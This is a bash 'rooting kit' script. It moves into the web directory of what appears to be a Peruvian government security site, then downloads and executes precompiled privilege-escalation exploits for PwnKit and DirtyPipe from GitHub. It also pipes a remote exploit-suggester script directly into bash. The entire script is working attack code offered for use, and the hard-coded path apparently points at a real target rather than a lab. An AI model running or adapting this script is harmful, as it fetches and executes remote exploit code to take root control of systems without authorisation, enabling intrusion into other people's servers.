#!/bin/bash
# Root-Exploit-AIO-NoGCC
echo "[!] Starting Rooting Kit (No-GCC Version)..."

cd /var/www/html/seguridad.grml.gob.pe 2>/dev/null || cd /tmp

# --- METHOD: PwnKit (Static Binary) ---
echo "[*] Downloading Pre-compiled PwnKit..."
curl -sL https://github.com/leonteale/pentest-package/raw/master/Exploits/CVE-2021-4034/pwnkit -o pwnkit
chmod +x pwnkit
./pwnkit && id && exit

# --- METHOD: DirtyPipe (Static Binary) ---
echo "[*] PwnKit failed, trying DirtyPipe Static..."
curl -sL https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/raw/main/exploit-1 -o dp
chmod +x dp
./dp /usr/bin/su && id && exit

# --- METHOD: CVE-2022-2588 (DirtyCred) ---
echo "[*] Trying Kernel Exploit Suggester (Kube)..."
curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash

echo "[-] Auto-exploit failed. Running manual ID..."
id
